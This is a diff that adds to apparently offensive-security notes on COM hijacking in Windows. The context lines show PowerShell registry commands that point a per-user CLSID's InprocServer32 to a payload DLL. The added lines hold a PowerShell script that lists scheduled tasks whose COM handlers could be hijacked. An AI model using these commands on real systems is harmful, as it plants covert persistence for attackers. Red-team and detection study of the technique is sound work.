@@ -65,3 +65,25 @@ New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F
 New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\Payloads\http_x64.dll"
 New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
 ```
+Can find hijackable COM in Task Scheduler with this powershell script
+```
+$Tasks = Get-ScheduledTask
+
+foreach ($Task in $Tasks)
+{
+  if ($Task.Actions.ClassId -ne $null)
+  {
+    if ($Task.Triggers.Enabled -eq $true)
+    {
+      if ($Task.Principal.GroupId -eq "Users")
+      {
+        Write-Host "Task Name: " $Task.TaskName
+        Write-Host "Task Path: " $Task.TaskPath
+        Write-Host "CLSID: " $Task.Actions.ClassId
+        Write-Host
+      }
+    }
+  }
+}
+```
+Review this list for possible exploitation parts by rechecking the HKCU and HKLM like above, and how often they are ran, lik at every user login or something of that nature
